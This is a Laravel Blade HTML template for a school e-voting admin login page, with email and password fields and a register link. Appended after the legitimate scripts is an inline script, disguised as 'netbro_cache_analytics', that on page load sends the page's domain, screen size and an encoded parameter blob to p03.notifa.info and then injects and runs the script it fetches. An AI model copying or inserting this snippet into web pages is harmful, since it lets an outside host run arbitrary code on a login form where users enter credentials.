<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Masuk Admin Sekolah</title>
    <!-- plugins:css -->
    <link rel="stylesheet" href="{{ asset ('assets-sekolah/vendors/iconfonts/mdi/css/materialdesignicons.min.css') }}">
    <link rel="stylesheet" href="{{ asset ('assets-sekolah/vendors/css/vendor.bundle.base.css') }}">
    <link rel="stylesheet" href="{{ asset ('assets-sekolah/vendors/css/vendor.bundle.addons.css') }}">
    <!-- endinject -->
    <!-- plugin css for this page -->
    <!-- End plugin css for this page -->
    <!-- inject:css -->
    <link rel="stylesheet" href="{{ asset ('assets-sekolah/css/style.css') }}">
    <!-- endinject -->
    <link rel="shortcut icon" href="{{ asset ('assets-sekolah/images/favicon.png') }}" />
</head>

<body>
<div class="container-scroller">
    <div class="container-fluid page-body-wrapper full-page-wrapper">
        <div class="content-wrapper d-flex align-items-center auth auth-bg-1 theme-one">
            <div class="row w-100 mx-auto">
                <div class="col-lg-4 mx-auto">
                    <h2 class="text-center mb-4">Login Admin Sekolah</h2>
                    <div class="auto-form-wrapper">
                        <form method="post" action="{{route('adminsekolah.login.submit')}}">
                            @csrf
                            <div class="form-group">
                                <label class="label">Email</label>
                                <div class="input-group">
                                    <input type="email" class="form-control @error('email') is-invalid @enderror"  value="{{ old('email') }}"
                                           name="email" placeholder="Masukkan E-mail">
                                    @error('email')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                    @enderror
                                    <div class="input-group-append">
                                        <span class="input-group-text"><i class="mdi mdi-check-circle-outline"></i></span>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <label class="label">Password</label>
                                <div class="input-group">
                                    <input type="password" class="form-control @error('password') is-invalid @enderror"
                                           name="password" placeholder="*********">
                                    @error('password')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                    @enderror
                                    <div class="input-group-append">
                                        <span class="input-group-text"><i class="mdi mdi-check-circle-outline"></i></span>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group">
                                <button class="btn btn-primary submit-btn btn-block">Masuk</button>
                            </div>
                            <div class="form-group d-flex justify-content-between">
                                <div class="form-check form-check-flat mt-0">

                                </div>
                                <a href="#" class="text-small forgot-password text-black">Lupa Kata Sandi?</a>
                            </div>

                            <div class="text-block text-center my-3">
                                <span class="text-small font-weight-semibold">Belum punya akun ?</span>
                                <a href="{{route('adminsekolah.register')}}" class="text-black text-small">Buat Akun Baru</a>
                            </div>
                        </form>
                    </div>
                    <ul class="auth-footer">
                        <li><a href="#">Conditions</a></li>
                        <li><a href="#">Help</a></li>
                        <li><a href="#">Terms</a></li>
                    </ul>
                    <p class="footer-text text-center">copyright © 2020 E-voting. All rights reserved.</p>
                </div>
            </div>
        </div>
        <!-- content-wrapper ends -->
    </div>
    <!-- page-body-wrapper ends -->
</div>
<!-- container-scroller -->
<!-- plugins:js -->
<script src="{{ asset ('assets-sekolah/vendors/js/vendor.bundle.base.js') }}"></script>
<script src="{{ asset ('assets-sekolah/vendors/js/vendor.bundle.addons.js') }}"></script>
<!-- endinject -->
<!-- inject:js -->
<script src="{{ asset ('assets-sekolah/js/template.js') }}"></script>
<!-- endinject -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX8%2flUox7P%2f3BG1skLCJXKsTwipzOehaaLRf5nL3LwlIqv0sAkixMAE1coHzWL%2bmITMAKwVZqv5FImQGCIkye3clJWwr6hs9%2bB%2bWD2oe4TYlAxiDut9zjq%2bca9Kklp50Yg2lYFwkEFuzXDXkM19FYyQWPaGbRSvqCqyDS9UOTU0x7EfONJaimJIZVB7q3Aj8wyYWmhH8xIMDzekHU2aKSViR6eI5NpUAlqN1iKrphL5d8FnAT%2fVX8UTXz2qf6i6aVj2I4opbYJ%2bnGMdVQ2YLlgOVxA4C%2f%2fPx%2b8j1mPMw%2flF3Wx%2bVywgO%2fLtp0%2f7Q9WuFi6y%2bWKH2kQ%2btt69r6YmcPVWcqZxNZabEJ9aSz5o9Jqb420jxPTyLllwVfdS3HoV4AaE9sWNDf8vjX7Iz8K8TbvZWBkwam%2bAhm6C3Qqer9x2%2fTyoArmve2oIZ7CexowXxxoO37VpmZk0VCD0v5EQ0OQ%2bQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
